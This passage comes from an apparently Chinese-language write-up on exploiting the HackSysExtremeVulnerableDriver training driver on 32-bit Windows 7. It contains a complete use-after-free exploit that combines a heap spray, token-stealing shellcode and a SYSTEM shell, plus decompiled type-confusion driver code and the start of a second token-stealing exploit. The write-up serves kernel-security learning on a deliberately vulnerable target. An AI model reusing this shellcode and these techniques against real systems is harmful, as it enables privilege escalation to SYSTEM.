</span></span><span class="line"><span class="cl"><span class="err">00</span><span class="nf">b7104b</span> <span class="mi">8</span><span class="no">b4050</span>          <span class="no">mov</span>     <span class="no">eax</span><span class="p">,</span><span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">eax</span><span class="err">+</span><span class="mi">50</span><span class="no">h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">00</span><span class="nf">b7104e</span> <span class="mi">8</span><span class="no">bc8</span>            <span class="no">mov</span>     <span class="no">ecx</span><span class="p">,</span><span class="no">eax</span></span></span></code></pre></div><h3 id="exp-1" class="heading-element">
  <a href="#exp-1" class="heading-mark"></a>EXP</h3><p>代码：</p>
<div class="highlight" id="id-87"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##include &lt;stdio.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;Windows.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="nf">void</span><span class="p">(</span><span class="o">*</span><span class="n">FunctionPointer</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">ShellCode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">_asm</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">nop</span>
</span></span><span class="line"><span class="cl">		<span class="n">pushad</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="nl">fs</span><span class="p">:</span> <span class="p">[</span><span class="mi">124</span><span class="n">h</span><span class="p">]</span> <span class="c1">// 找到当前线程的_KTHREAD结构
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">]</span> <span class="c1">// 找到_EPROCESS结构
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="n">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">eax</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mi">4</span> <span class="c1">// edx = system PID(4)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">		<span class="c1">// 循环是为了获取system的_EPROCESS
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nl">find_sys_pid</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">					 <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mh">0xb8</span><span class="p">]</span> <span class="c1">// 找到进程活动链表
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>					 <span class="n">sub</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0xb8</span> <span class="c1">// 链表遍历
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>					 <span class="n">cmp</span><span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mh">0xb4</span><span class="p">],</span> <span class="n">edx</span> <span class="c1">// 根据PID判断是否为SYSTEM
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>					 <span class="n">jnz</span> <span class="n">find_sys_pid</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">					 <span class="c1">// 替换Token
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>					 <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mh">0xf8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">					 <span class="n">mov</span><span class="p">[</span><span class="n">ecx</span> <span class="o">+</span> <span class="mh">0xf8</span><span class="p">],</span> <span class="n">edx</span>
</span></span><span class="line"><span class="cl">					 <span class="n">popad</span>
</span></span><span class="line"><span class="cl">					 <span class="n">ret</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">VOID</span> <span class="nf">CreateCmd</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">)</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="n">si</span><span class="p">.</span><span class="n">dwFlags</span> <span class="o">=</span> <span class="n">STARTF_USESHOWWINDOW</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">si</span><span class="p">.</span><span class="n">wShowWindow</span> <span class="o">=</span> <span class="n">SW_SHOW</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">WCHAR</span> <span class="n">wzFilePath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="sa">L</span><span class="s">&#34;cmd.exe&#34;</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="n">BOOL</span> <span class="n">bReturn</span> <span class="o">=</span> <span class="nf">CreateProcessW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">wzFilePath</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPSTARTUPINFOW</span><span class="p">)</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">bReturn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="nf">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">),</span> <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">DWORD</span> <span class="n">recvBuf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// 获取句柄
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nf">CreateFileA</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span> <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Start to get HANDLE...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span> <span class="o">||</span> <span class="n">hDevice</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;获取句柄失败</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// 调用 AllocateUaFObject() 函数申请内存
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Start to call AllocateUaFObject()...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x222013</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">recvBuf</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// 调用 FreeUaFObject() 函数释放对象
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Start to call FreeUaFObject()...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x22201B</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">recvBuf</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Start to write shellcode()...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// 申请假的chunk
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kt">char</span> <span class="n">fakechunk</span><span class="p">[</span><span class="mh">0x58</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sc">&#39;A&#39;</span><span class="p">,</span> <span class="sc">&#39;B&#39;</span><span class="p">,</span> <span class="sc">&#39;C&#39;</span><span class="p">,</span> <span class="sc">&#39;D&#39;</span><span class="p">,</span> <span class="sc">&#39;A&#39;</span><span class="p">,</span> <span class="sc">&#39;B&#39;</span><span class="p">,</span> <span class="sc">&#39;C&#39;</span><span class="p">,</span> <span class="sc">&#39;D&#39;</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// 指向我们的shellcode
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="o">*</span><span class="p">(</span><span class="n">PDWORD</span><span class="p">)</span><span class="n">fakechunk</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">ShellCode</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// 用A填满该chunk
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// RtlFillMemory(fakeG_UseAfterFree-&gt;bufffer, sizeof(fakeG_UseAfterFree-&gt;bufffer), &#39;A&#39;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	<span class="c1">// 堆喷射
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Start to heap spray...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">5000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x22201F</span><span class="p">,</span> <span class="n">fakechunk</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">recvBuf</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Start to call UseUaFObject()...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x222017</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">recvBuf</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Start to create cmd...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">CreateCmd</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><h2 id="7typeconfusing-triggertypeconfusion" class="heading-element">
  <a href="#7typeconfusing-triggertypeconfusion" class="heading-mark"></a>7.TypeConfusing-TriggerTypeConfusion</h2><p>该漏洞为类型混淆漏洞</p>
<h3 id="漏洞分析-2" class="heading-element">
  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-2" class="heading-mark"></a>漏洞分析</h3><p>先申请了8字节的非分页内存空间，之后调用<code>ProbForRead</code>验证用户缓冲区，之后就将用户缓冲区的内容复制到申请的非分页内存空间中，而未进行类型验证，然后<code>TypeConfusionObjectInitializer</code>中会执行 <code>Callback()</code>：</p>
<div class="highlight" id="id-88"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__stdcall</span> <span class="nf">TriggerTypeConfusion</span><span class="p">(</span><span class="n">_USER_TYPE_CONFUSION_OBJECT</span> <span class="o">*</span><span class="n">UserTypeConfusionObject</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">_KERNEL_TYPE_CONFUSION_OBJECT</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// ebx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">Status</span><span class="p">;</span> <span class="c1">// [esp+14h] [ebp-1Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">ProbeForRead</span><span class="p">(</span><span class="n">UserTypeConfusionObject</span><span class="p">,</span> <span class="mi">8u</span><span class="p">,</span> <span class="mi">1u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v1</span> <span class="o">=</span> <span class="nf">ExAllocatePoolWithTag</span><span class="p">(</span><span class="n">NonPagedPool</span><span class="p">,</span> <span class="mi">8u</span><span class="p">,</span> <span class="mh">0x6B636148u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Tag: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;&#39;kcaH&#39;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Type: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;NonPagedPool&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Size: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Chunk: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] UserTypeConfusionObject: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">UserTypeConfusionObject</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] KernelTypeConfusionObject: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] KernelTypeConfusionObject Size: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">v1</span> <span class="o">=</span> <span class="o">*</span><span class="n">UserTypeConfusionObject</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] KernelTypeConfusionObject-&gt;ObjectID: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v1</span><span class="o">-&gt;</span><span class="n">ObjectID</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] KernelTypeConfusionObject-&gt;ObjectType: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v1</span><span class="o">-&gt;</span><span class="n">Callback</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Triggering Type Confusion</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">Status</span> <span class="o">=</span> <span class="nf">TypeConfusionObjectInitializer</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Freeing KernelTypeConfusionObject Object</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Tag: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;&#39;kcaH&#39;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Chunk: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ExFreePoolWithTag</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="mh">0x6B636148u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">Status</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[-] Unable to allocate Pool chunk</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1073741801</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__stdcall</span> <span class="nf">TypeConfusionObjectInitializer</span><span class="p">(</span><span class="n">_KERNEL_TYPE_CONFUSION_OBJECT</span> <span class="o">*</span><span class="n">KernelTypeConfusionObject</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] KernelTypeConfusionObject-&gt;Callback: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">KernelTypeConfusionObject</span><span class="o">-&gt;</span><span class="n">Callback</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Calling Callback</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">KernelTypeConfusionObject</span><span class="o">-&gt;</span><span class="nf">Callback</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Kernel Type Confusion Object Initialized</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><h3 id="exp-2" class="heading-element">
  <a href="#exp-2" class="heading-mark"></a>EXP</h3><p>下面两种方法都可以(其实是一种)</p>
<div class="highlight" id="id-89"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##include &lt;stdio.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;Windows.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_UserObject</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">ULONG_PTR</span> <span class="n">ObjectID</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ULONG_PTR</span> <span class="n">ObjectType</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">UserObject</span><span class="p">,</span> <span class="o">*</span><span class="n">PUserObject</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">##define KTHREAD_OFFSET 0x124  </span><span class="c1">// nt!_KPCR.PcrbData.CurrentThread
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">##define EPROCESS_OFFSET 0x050 </span><span class="c1">// nt!_KTHREAD.ApcState.Process
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">##define PID_OFFSET 0x0B4      </span><span class="c1">// nt!_EPROCESS.UniqueProcessId
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">##define FLINK_OFFSET 0x0B8    </span><span class="c1">// nt!_EPROCESS.ActiveProcessLinks.Flink
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">##define TOKEN_OFFSET 0x0F8    </span><span class="c1">// nt!_EPROCESS.Token
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">##define SYSTEM_PID 0x004      </span><span class="c1">// SYSTEM Process PID
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">VOID</span> <span class="nf">TokenStealingPayloadWin7</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Importance of Kernel Recovery
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kr">__asm</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">pushad</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="p">;</span> <span class="err">获取当前进程</span><span class="n">EPROCESS</span>
</span></span><span class="line"><span class="cl">		<span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="nl">fs</span><span class="p">:</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="n">KTHREAD_OFFSET</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="n">EPROCESS_OFFSET</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="p">;</span> <span class="err">搜索</span><span class="n">system进程EPROCESS</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="n">SYSTEM_PID</span>
</span></span><span class="line"><span class="cl">		<span class="nl">SearchSystemPID</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="n">FLINK_OFFSET</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">			<span class="n">sub</span> <span class="n">eax</span><span class="p">,</span> <span class="n">FLINK_OFFSET</span>
</span></span><span class="line"><span class="cl">			<span class="n">cmp</span><span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="n">PID_OFFSET</span><span class="p">],</span> <span class="n">edx</span>
</span></span><span class="line"><span class="cl">			<span class="n">jne</span> <span class="n">SearchSystemPID</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="p">;</span> <span class="n">token窃取</span>
</span></span><span class="line"><span class="cl">			<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="n">TOKEN_OFFSET</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">			<span class="n">mov</span><span class="p">[</span><span class="n">ecx</span> <span class="o">+</span> <span class="n">TOKEN_OFFSET</span><span class="p">],</span> <span class="n">edx</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="p">;</span> <span class="err">环境还原</span> <span class="o">+</span> <span class="err">返回</span>
</span></span><span class="line"><span class="cl">			<span class="n">popad</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
